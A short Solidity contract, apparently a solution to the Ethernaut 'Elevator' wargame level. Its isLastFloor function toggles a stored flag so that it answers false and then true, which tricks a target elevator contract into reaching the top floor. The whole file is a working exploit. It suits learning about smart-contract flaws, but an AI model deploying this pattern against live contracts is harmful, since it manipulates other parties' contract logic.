// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract Building {

    IElevator public target;
    bool top;

  constructor(IElevator _target) {
    target = _target;
  }

  function goTo() external {
    target.goTo(2);
  }

  function isLastFloor(uint256 floor) external returns(bool) {
    bool aux = top;
    top = !top;
    return aux;
  }
}